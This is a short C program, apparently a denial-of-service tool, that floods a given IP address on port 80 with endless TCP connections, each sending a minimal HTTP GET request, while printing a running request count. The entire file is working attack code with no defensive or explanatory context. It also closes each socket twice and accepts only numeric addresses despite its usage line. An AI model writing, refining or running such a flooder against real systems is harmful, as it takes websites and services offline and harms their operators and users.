#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Use: %s <ip/host>\n", argv[0]);
        return 1;
    }
    
    char* target = argv[1];
    int port = 80;
    int count = 0;
    
    printf("Flooding %s:80 ...\n", target);
    
    while(1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, target, &addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char* req = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
            send(sock, req, strlen(req), 0);
            close(sock);
            count++;
            printf("\rRequests: %d", count);
            fflush(stdout);
        }
        
        close(sock);
    }
    
    return 0;
}